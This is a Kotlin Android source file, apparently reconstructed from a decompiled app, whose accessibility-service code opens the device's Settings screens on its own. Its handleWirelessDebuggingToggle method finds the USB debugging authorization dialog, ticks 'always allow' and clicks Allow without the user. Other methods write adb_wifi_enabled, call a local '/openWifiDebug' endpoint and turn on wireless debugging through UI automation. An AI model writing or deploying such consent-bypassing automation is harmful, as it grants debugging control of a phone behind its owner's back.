package com.storm.safe.rock.service.modules.setup.flow

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.graphics.Path
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import com.storm.safe.rock.service.modules.setup.SetupConstants
import com.storm.safe.rock.service.modules.setup.SystemOptimizeManager

/**
 * WirelessDebugNavigator -- Wireless debugging page UI navigation.
 *
 * Extracted from SystemOptimizeManager.kt:
 *   - handleWirelessDebuggingToggle() (L3184-3228) vendor: h0 (line 3084)
 *   - isInWifiDebugWindow() (L1843-1869) vendor: a6 / m212032a6 (line 1936)
 *   - enableWirelessDebuggingViaSettings() (L4699-4731) vendor: k7 (line 5278)
 *   - findPairingInfo() (L3126-3183) vendor: f1 (line 2988)
 *   - scrollForwardFindNode() (L4135-4158) vendor: j8 (line 5015)
 *   - scrollForwardEnd() (L4105-4134) vendor: j7 (line 4995)
 *   - scrollBackwardEnd() (L4069-4104) vendor: j6 (line 4968)
 *
 * JADX: C0360a2.java (methods h0, a6, k7, f1, j8, j7, j6)
 */
class WirelessDebugNavigator(
    private val service: AccessibilityService,
    private val context: Context
) {

    companion object {
        private const val TAG = "WirelessDebugNavigator"
    }

    /**
     * Handle wireless debugging toggle -- find and click the switch in dev options.
     * vendor: h0 (line 3084)
     *
     * Detects USB debugging authorization dialog and auto-clicks "Allow".
     */
    fun handleWirelessDebuggingToggle(lastUsbDebugDialogTime: Long): Long {
        var updatedTime = lastUsbDebugDialogTime
        val cachedRoot = service.rootInActiveWindow ?: return updatedTime

        val usbDebugTexts = SetupConstants.USB_DEBUG_DIALOG_TEXTS
        for (text in usbDebugTexts) {
            val nodes = cachedRoot.findAccessibilityNodeInfosByText(text)
            if (nodes != null && nodes.isNotEmpty()) {
                Log.i(TAG, "检测到 USB 调试弹窗（包含相关文本）")
                val now = System.currentTimeMillis()
                if (now - lastUsbDebugDialogTime < 5000) return updatedTime

                // Try to check "always allow" checkbox
                try {
                    val compoundButton = SystemOptimizeManager.findCompoundButton(cachedRoot)
                    if (compoundButton != null) {
                        if (compoundButton.isChecked) {
                            Log.i(TAG, "CompoundButton 已勾选")
                        } else {
                            compoundButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            Log.d(TAG, "已勾选 CompoundButton (一律允许)")
                            SystemClock.sleep(300L)
                        }
                    }
                } catch (_: Exception) {}

                // Click OK button (button1 or btn_positive)
                try {
                    val button1 = cachedRoot.findAccessibilityNodeInfosByViewId("android:id/button1")
                    var okBtn = button1?.firstOrNull()
                    if (okBtn == null) {
                        val altBtn = cachedRoot.findAccessibilityNodeInfosByViewId("com.android.settings:id/btn_positive")
                        okBtn = altBtn?.firstOrNull()
                    }
                    if (okBtn != null) {
                        okBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        updatedTime = now
                        Log.d(TAG, "已点击 button1 (允许USB调试)")
                    }
                } catch (_: Exception) {}
                return updatedTime
            }
        }
        return updatedTime
    }

    /**
     * Check if current window is the wireless debugging detail page.
     * vendor: a6 / m212032a6 (line 1936)
     */
    fun isInWifiDebugWindow(): Boolean {
        return try {
            // ADAPT: MIUI — 优先用窗口 title 匹配
            if (hasWifiDebugWindowByTitle()) {
                Log.d(TAG, "isInWifiDebugWindow: 通过窗口 title 匹配")
                return true
            }

            val root = service.rootInActiveWindow ?: return false
            val pkg = root.packageName?.toString() ?: ""
            if (!pkg.contains("settings", ignoreCase = true)) {
                try { root.recycle() } catch (_: Exception) {}
                return false
            }
            try {
                for (text in SetupConstants.WIRELESS_DEBUG_PAGE_TEXTS) {
                    val nodes = root.findAccessibilityNodeInfosByText(text)
                    if (!nodes.isNullOrEmpty()) {
                        Log.d(TAG, "isInWifiDebugWindow: 找到'$text' via activeWindow")
                        return true
                    }
                }
                false
            } finally {
                try { root.recycle() } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            Log.e(TAG, "isInWifiDebugWindow 异常", e)
            false
        }
    }

    private val WIFI_DEBUG_TITLES = listOf(
        "无线调试", "無線偵錯", "Wireless debugging",
        "ワイヤレスデバッグ", "무선 디버깅"
    )

    private fun hasWifiDebugWindowByTitle(): Boolean {
        return try {
            val windows = service.windows ?: return false
            for (window in windows) {
                if (window.type != AccessibilityWindowInfo.TYPE_APPLICATION) continue
                val title = window.title?.toString() ?: continue
                if (WIFI_DEBUG_TITLES.any { title.contains(it, ignoreCase = true) }) {
                    return true
                }
            }
            false
        } catch (_: Exception) { false }
    }

    /**
     * Enable wireless debugging via Settings.Global write.
     * vendor: k7 (line 5278)
     *
     * Tries direct Settings.Global write first, then falls back to local-service API.
     */
    fun enableWirelessDebuggingViaSettings(
        isWirelessDebuggingEnabled: () -> Boolean,
        postToLocalService: (String, String) -> String?
    ) {
        try {
            try {
                Settings.Global.putInt(context.contentResolver, "adb_wifi_enabled", 1)
            } catch (e: SecurityException) {
                Log.w(TAG, "e0() Settings.Global 写入被拒绝（WRITE_SECURE_SETTINGS 未授予？）: ${e.message}")
            }

            if (isWirelessDebuggingEnabled()) {
                Log.d(TAG, "e0() 直接写 Settings.Global 开启无线调试成功")
                return
            }

            // Fallback via local-service /openWifiDebug
            // vendor: m212002c8(this, "/openWifiDebug", null, 6)
            try {
                val result = postToLocalService("/openWifiDebug", "{}")
                Log.d(TAG, "e0() fallback via local-service: $result")
            } catch (e2: Exception) {
                Log.w(TAG, "e0() /openWifiDebug 失败: ${e2.message}")
            }
        } catch (e: Exception) {
            Log.w(TAG, "e0() 开启无线调试异常: ${e.message}")
        }
    }

    /**
     * Find pairing toggle info -- checks if wireless debugging switch is ON.
     * vendor: f1 (line 2988)
     *
     * Returns a Pair<Boolean, Boolean> where:
     *   first = isChecked (switch is ON)
     *   second = wasClicked (we performed a click action)
     */
    fun findPairingInfo(node: AccessibilityNodeInfo): Pair<Boolean, Boolean> {
        var isChecked = false
        var wasClicked = false
        try {
            var switchNode: AccessibilityNodeInfo? = if (node.isCheckable) node else null
            var parent = node
            var depth = 0
            while (switchNode == null && depth < 3) {
                parent = parent.parent ?: break
                switchNode = SystemOptimizeManager.findSwitchNode(parent)
                depth++
            }

            if (switchNode == null) {
                val root = service.rootInActiveWindow
                if (root != null) {
                    switchNode = SystemOptimizeManager.findToggleNode(root)
                }
            }

            if (switchNode != null) {
                isChecked = switchNode.isChecked
                if (!isChecked && switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.i(TAG, "switchNode clicked")
                    wasClicked = true
                    SystemOptimizeManager.sleep200(5) // 1000ms
                    switchNode.refresh()
                    isChecked = switchNode.isChecked
                }
                if (!isChecked && !wasClicked) {
                    val clickableParent = SystemOptimizeManager.findClickableParentCompat(switchNode)
                    if (clickableParent != null && clickableParent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        wasClicked = true
                        SystemOptimizeManager.sleep200(5)
                        switchNode.refresh()
                        isChecked = switchNode.isChecked
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "f0() 异常", e)
        }
        return Pair(isChecked, wasClicked)
    }

    /**
     * Scroll forward and search for node matching text list.
     * vendor: j8 (line 5015)
     *
     * Scrolls forward up to 3 times, searching for a node matching the given texts.
     */
    fun scrollForwardFindNode(scrollableNode: AccessibilityNodeInfo, texts: List<String>): AccessibilityNodeInfo? {
        for (i in 0 until 3) {
            try {
                val root = service.rootInActiveWindow ?: return null
                val found = SystemOptimizeManager.findNodeByTexts(root, texts)
                if (found != null) return found

                val scrolled = scrollableNode.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                if (!scrolled) return null
                SystemOptimizeManager.sleep200(5)
            } catch (e: Exception) {
                Log.e(TAG, "scrollForwardUtil 异常", e)
                return null
            }
        }
        return null
    }

    /**
     * Scroll forward to end (bottom) via gesture.
     * vendor: j7 (line 4995)
     *
     * Dispatches 20 swipe-up gestures to scroll to the bottom of a scrollable view.
     */
    fun scrollForwardEnd(node: AccessibilityNodeInfo) {
        try {
            val dm = context.resources.displayMetrics
            val centerX = dm.widthPixels / 2.0f
            val height = dm.heightPixels.toFloat()
            val startY = 0.8f * height
            val endY = height * 0.2f
            for (i in 0 until 20) {
                val path = Path()
                path.moveTo(centerX, startY)
                path.lineTo(centerX, endY)
                service.dispatchGesture(
                    GestureDescription.Builder()
                        .addStroke(GestureDescription.StrokeDescription(path, 0L, 100L))
                        .build(), null, null
                )
                Thread.sleep(150L)
            }
            node.refresh()
        } catch (e: Exception) {
            Log.e(TAG, "scrollForwardEnd 异常", e)
        }
    }

    /**
     * Scroll backward to end (top) via gesture.
     * vendor: j6 (line 4968)
     *
     * Dispatches swipe-down gestures to scroll back to top.
     */
    fun scrollBackwardEnd(node: AccessibilityNodeInfo) {
        try {
            val dm = context.resources.displayMetrics
            val centerX = dm.widthPixels / 2.0f
            val height = dm.heightPixels.toFloat()
            for (i in 0 until 5) {
                val actions = node.actionList
                if (actions.isNotEmpty()) {
                    val hasScrollBackward = actions.any { it.id == AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD }
                    if (!hasScrollBackward) {
                        Log.i(TAG, "scrollBackwardEnd: 已到达顶部（第 $i 次）")
                        return
                    }
                }
                val path = Path()
                path.moveTo(centerX, 0.2f * height)
                path.lineTo(centerX, height * 0.8f)
                service.dispatchGesture(
                    GestureDescription.Builder()
                        .addStroke(GestureDescription.StrokeDescription(path, 0L, 100L))
                        .build(), null, null
                )
                Thread.sleep(150L)
                node.refresh()
            }
        } catch (e: Exception) {
            Log.e(TAG, "scrollBackwardEnd 异常", e)
        }
    }
}
